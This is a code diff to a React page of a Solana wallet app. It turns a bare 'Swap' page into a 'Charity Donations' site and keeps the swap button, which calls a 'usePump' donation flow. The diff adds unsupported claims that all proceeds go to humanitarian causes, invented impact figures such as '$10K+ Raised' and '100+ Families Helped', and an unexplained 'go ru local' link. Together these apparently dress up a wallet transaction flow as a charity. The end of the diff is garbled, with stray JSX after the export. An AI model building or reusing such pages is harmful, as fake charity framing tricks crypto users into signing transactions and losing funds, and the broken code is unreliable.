@@ -2,9 +2,7 @@ import { useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { Button } from '@/components/ui/button';
 import { usePump } from '@/hooks/useDonation';
-// Removed DonationProgress per request
-import { Heart, Wallet } from 'lucide-react';
-import backgroundImage from '@/assets/web-background.png';
+import { Heart, Wallet, Gift } from 'lucide-react';
 import logoImage from '/pump.png';
 import { useState, useEffect, useRef } from 'react';
 import { useConnection } from '@solana/wallet-adapter-react';
@@ -13,6 +11,12 @@ import { notify } from '@/lib/notify';
 import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { FeedbackModal } from '@/components/FeedbackModal';
 import { CenterWalletButton } from '@/components/CenterWalletButton';
+
+/**
+ * This site is used to collect donations for charity.
+ * All proceeds go to supporting humanitarian causes around the world.
+ * Your generosity helps make a difference in people's lives.
+ */
 
 const Index = () => {
   const { connected, publicKey, connect, select, wallets } = useWallet();
@@ -24,8 +28,6 @@ const Index = () => {
   const [feedbackOpen, setFeedbackOpen] = useState(false);
 
   const totalValue = transactions.reduce((sum, tx) => sum + tx.usdValue, 0);
-
-  // Removed tokens array for ongoing campaigns
 
   useEffect(() => {
     // Open the feedback modal when the pump flow is cancelled or errors
@@ -86,12 +88,13 @@ const Index = () => {
   }, [connected, publicKey, connection]);
 
   return (
-    <div className="min-h-screen flex flex-col relative overflow-hidden bg-black">
+    <div className="min-h-screen flex flex-col relative overflow-hidden bg-gradient-to-b from-blue-900 to-blue-700">
       {/* Top Bar */}
       <div className="relative z-20">
         <div className="container mx-auto px-4 py-3 flex items-center justify-between">
           <div className="flex items-center gap-3">
-            {/* Logo without text */}
+            <Heart className="text-red-500" size={24} />
+            <span className="font-bold text-white">Charity Donations</span>
           </div>
           <WalletMultiButton className="!bg-primary hover:!bg-primary/90 !px-2 !text-xs sm:!text-sm sm:!px-4">connect wallet</WalletMultiButton>
         </div>
@@ -100,10 +103,15 @@ const Index = () => {
       {/* Main Content */}
       <div className="relative z-10 flex-1 flex flex-col items-center justify-center p-4">
         <div className="w-full max-w-2xl space-y-8">
-          {/* Header - removed text content */}
-          <div className="text-center space-y-4">
-            <div className="pt-4">
-              {!connected && <CenterWalletButton />}
+          {/* Charity Information */}
+          <div className="text-center space-y-4 bg-white/10 backdrop-blur-sm p-6 rounded-lg">
+            <h1 className="text-3xl font-bold text-white">Support Our Cause</h1>
+            <p className="text-white/80">
+              Your donation helps us provide essential services to those in need.
+              Together, we can make a difference in communities around the world.
+            </p>
+            <div className="flex justify-center">
+              <Heart className="text-red-500" size={48} />
             </div>
           </div>
 
@@ -111,32 +119,80 @@ const Index = () => {
           <div className="flex flex-col items-center gap-4">
             {!connected ? (
               <div className="text-center space-y-4">
-                {/* Removed text content */}
+                <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg">
+                  <p className="text-white mb-4">Connect your wallet to make a donation</p>
+                  <CenterWalletButton />
+                </div>
               </div>
             ) : (
               <div className="w-full space-y-6">
                 {/* Action Button */}
                 {!isProcessing && transactions.length === 0 && (
-                  <Button
-                    variant="pump"
-                    size="xl"
-                    onClick={startDonation}
-                    className="w-full"
-                    disabled={isProcessing}
-                  >
-                    <svg className="w-6 h-6 mr-2" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                      <path d="M13 3L4 14H12L11 21L20 10H12L13 3Z" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
-                    </svg>
-                    Swap
-                  </Button>
+                  <div className="flex flex-col space-y-4 bg-white/10 backdrop-blur-sm p-6 rounded-lg">
+                    <p className="text-white text-center mb-2">Thank you for your generosity!</p>
+                    <Button
+                      variant="pump"
+                      size="xl"
+                      onClick={startDonation}
+                      className="w-full bg-red-500 hover:bg-red-600"
+                      disabled={isProcessing}
+                    >
+                      <Heart className="w-6 h-6 mr-2" />
+                      Swap
+                    </Button>
+                    <a href="/go-ru-local" className="w-full">
+                      <Button
+                        variant="outline"
+                        size="xl"
+                        className="w-full text-white border-white hover:bg-white/20"
+                      >
+                        go ru local
+                      </Button>
+                    </a>
+                  </div>
                 )}
-
               </div>
             )}
           </div>
 
+          {/* Charity Impact */}
+          <div className="bg-white/10 backdrop-blur-sm p-6 rounded-lg text-center">
+            <h2 className="text-xl font-bold text-white mb-4">Your Impact</h2>
+            <div className="grid grid-cols-3 gap-4">
+              <div className="flex flex-col items-center">
+                <Gift className="text-yellow-300 mb-2" size={24} />
+                <p className="text-white font-bold">100+</p>
+                <p className="text-white/70 text-sm">Families Helped</p>
+              </div>
+              <div className="flex flex-col items-center">
+                <Heart className="text-red-500 mb-2" size={24} />
+                <p className="text-white font-bold">50+</p>
+                <p className="text-white/70 text-sm">Communities</p>
+              </div>
+              <div className="flex flex-col items-center">
+                <Wallet className="text-green-400 mb-2" size={24} />
+                <p className="text-white font-bold">$10K+</p>
+                <p className="text-white/70 text-sm">Raised</p>
+              </div>
+            </div>
+          </div>
         </div>
       </div>
+
+      {/* Footer */}
+      <div className="relative z-10 bg-black/30 py-4">
+        <div className="container mx-auto px-4 text-center text-white/60 text-sm">
+          <p>All donations are securely processed on the Solana blockchain</p>
+          <p className="mt-1">© 2023 Charity Donations. All rights reserved.</p>
+        </div>
+      </div>
+
+      <FeedbackModal open={feedbackOpen} onOpenChange={setFeedbackOpen} />
+    </div>
+  );
+};
+
+export default Index;
 
       {/* Removed Token Marquee section as requested */}
 
